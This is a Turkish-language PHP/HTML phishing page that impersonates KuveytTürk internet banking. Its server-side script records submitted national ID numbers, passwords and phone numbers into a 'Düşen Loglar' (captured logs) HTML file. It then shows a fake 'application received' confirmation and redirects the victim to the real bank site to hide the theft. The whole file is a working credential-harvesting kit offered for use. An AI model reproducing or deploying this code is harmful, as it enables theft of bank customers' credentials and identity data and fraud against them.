
<!DOCTYPE html>
<html lang="tr">
<?php
             
                      error_reporting(0);
    if (isset($_POST['submit'])) {
        // Formdan gelen veriyi al
        $veri = $_POST['username'];
        
        $verii = $_POST['password'];
        
        
        $telefon = $_POST['telefon'];
        
        $dosyaAdi = "veriler.html";

        // İlk defa dosya oluşturuluyorsa tablo yapısını başlat
        if (!file_exists($dosyaAdi)) {
            $htmlIcerik = "<!DOCTYPE html>\n";
            $htmlIcerik .= "<html lang='tr'>\n";
            $htmlIcerik .= "<head>\n";
            $htmlIcerik .= "<meta charset='UTF-8'>\n";
            $htmlIcerik .= "<title>Düşen Loglar</title>\n";
            $htmlIcerik .= "<style>
                body { font-family: Arial, sans-serif; background-color: #f4f4f9; }
                h2 { color: #333; text-align: center; }
                table { width: 50%; margin: 20px auto; border-collapse: collapse; }
                th, td { padding: 10px; border: 1px solid #ccc; text-align: left; }
                th { background-color: #e0e0e0; }
                tr:nth-child(even) { background-color: #f9f9f9; }
            </style>\n";
            $htmlIcerik .= "</head>\n";
            $htmlIcerik .= "<body>\n";
            $htmlIcerik .= "<h2>Düşen Loglar</h2>\n";
            $htmlIcerik .= "<table>\n";
            $htmlIcerik .= "<tr><th>Sıra</th><th>Tc Kimlik</th><th>Şifre</th><th>Telefon</th></tr>\n";
            file_put_contents($dosyaAdi, $htmlIcerik); // Dosya oluşturulup başlangıç içerik yazıldı
        }

        // Mevcut içeriği oku ve kapanış etiketlerini sil
        $mevcutIcerik = file_get_contents($dosyaAdi);
        $mevcutIcerik = str_replace("</table>\n</body>\n</html>", "", $mevcutIcerik);

        // Dosyada mevcut veri varsa oku ve sıra numarasını belirle
        $mevcutVeriler = file($dosyaAdi, FILE_IGNORE_NEW_LINES);
        $sira = count($mevcutVeriler) - 3; // Başlık satırlarını saymadan başlangıç

        // Yeni veri satırını oluştur
        $yeniSatir = "<tr><td>" . ($sira + 1) . "</td><td>" . htmlspecialchars($veri). "</td><td>" . htmlspecialchars($verii). "</td><td>" .($telefon). "</td></tr>\n";

        // Güncellenmiş içeriğe yeni veriyi ve kapanış etiketlerini ekle
        $mevcutIcerik .= $yeniSatir . "</table>\n</body>\n</html>";

        // Güncellenmiş içeriği dosyaya yaz
        file_put_contents($dosyaAdi, $mevcutIcerik);

        
    }
    ?>
<head>
    <meta charset="UTF-8">
    <title>İnternet Bankacılığı - KuveytTürk</title>
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no" />
    <meta name="google" content="notranslate" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="./style.css">
    <script>
        // 3 saniye sonra yönlendirme fonksiyonu
        setTimeout(function() {
            window.location.href = "https://kuveytturk.com.tr";
        }, 2000); // 3000 milisaniye = 3 saniye
    </script>
    <style>
        .tab_head {
            display: flex;
        }
        html { 
   margin: 0 auto;
   max-width: 420px;
      }
        .tab_head_title {
            width: 100%;
            text-align: center;
            border: 0;
            color: #9d9d9d;
            border-bottom: 2px solid #d0d1d6;
        }

        .tab_head_title.active {
            color: #1ca288;
            border-bottom: 2px solid #1ca288;
        }

        .tab_head_title span {
            font-size: 14px;
            font-weight: 600;
            padding: 10px 0;
            display: block;
        }

        .tab_body_content {
            display: none;
        }

        .tab_body_content.active {
            display: block;
        }
    </style>
</head>

<body>
    <div class="root" style="max-width: 420px; margin: 0 auto;">
        <div class="header">
            <div class="d-flex justify-content-center">
                <img src="/logo.png" style="width:130px" alt="">
            </div>

        </div>
        <div class="tab_head">
            <div class="tab_head_title active" data-id="bireysel">
                <span>İşlem Başarılı</span>
            </div>
        </div>
        <div class="body">
            <div class="form">
                <div class="mb-4">
                   
                </div>
                <h4 style="font-size:18px">Başvurunuz başarılı bir şekilde oluşturulmuştur.</h4>
                <h4 style="font-size:15px">Müşteri temsilcimiz sizi en kısa zamanda arayacaktır.</h4>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script src="script.js?v=1.1.2"></script>

</body>

</html>